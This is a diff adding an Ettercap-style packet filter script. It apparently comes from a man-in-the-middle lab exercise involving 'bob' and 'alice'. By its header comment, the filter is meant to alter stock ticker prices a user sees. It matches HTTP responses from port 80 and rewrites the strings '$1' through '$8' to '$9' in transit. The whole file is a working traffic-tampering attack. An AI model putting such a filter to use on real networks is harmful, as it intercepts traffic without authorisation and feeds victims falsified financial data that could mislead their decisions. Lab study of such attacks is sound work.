@@ -1,0 +1,107 @@
+############################################################################
+#                                                                          #
+#  affect the prices a user of the stock ticker sees                       #
+#                                                                          #
+############################################################################
+
+# Check if the packet is TCP packet with source port 80
+# i.e. HTTP packet from bob to alice
+if (ip.proto == TCP && tcp.src == 80) {
+
+    # check if the payload contains the string "$1"
+    if (search(DATA.data, "$1")) {
+        
+        # replace "$1" with "$9"
+        # note: replacement string is same length as original string
+        replace("$1", "$9"); 
+        
+        # debug message
+        msg("zapped $1!\n");
+
+    }
+
+    # check if the payload contains the string "$2"
+    if (search(DATA.data, "$2")) {
+        
+        # replace "$2" with "$9"
+        # note: replacement string is same length as original string
+        replace("$2", "$9"); 
+        
+        # debug message
+        msg("zapped $2!\n");
+
+    }
+
+    # check if the payload contains the string "$3"
+    if (search(DATA.data, "$3")) {
+        
+        # replace "$3" with "$9"
+        # note: replacement string is same length as original string
+        replace("$3", "$9"); 
+        
+        # debug message
+        msg("zapped $3!\n");
+
+    }
+
+    # check if the payload contains the string "$4"
+    if (search(DATA.data, "$4")) {
+        
+        # replace "$4" with "$9"
+        # note: replacement string is same length as original string
+        replace("$4", "$9"); 
+        
+        # debug message
+        msg("zapped $4!\n");
+
+    }
+
+    # check if the payload contains the string "$5"
+    if (search(DATA.data, "$5")) {
+        
+        # replace "$5" with "$9"
+        # note: replacement string is same length as original string
+        replace("$5", "$9"); 
+        
+        # debug message
+        msg("zapped $5!\n");
+
+    }
+
+    # check if the payload contains the string "$6"
+    if (search(DATA.data, "$6")) {
+        
+        # replace "$6" with "$9"
+        # note: replacement string is same length as original string
+        replace("$6", "$9"); 
+        
+        # debug message
+        msg("zapped $6!\n");
+
+    }
+
+    # check if the payload contains the string "$7"
+    if (search(DATA.data, "$7")) {
+        
+        # replace "$7" with "$9"
+        # note: replacement string is same length as original string
+        replace("$7", "$9"); 
+        
+        # debug message
+        msg("zapped $7!\n");
+
+    }
+
+    # check if the payload contains the string "$8"
+    if (search(DATA.data, "$8")) {
+        
+        # replace "$8" with "$9"
+        # note: replacement string is same length as original string
+        replace("$8", "$9"); 
+        
+        # debug message
+        msg("zapped $8!\n");
+
+    }
+
+}
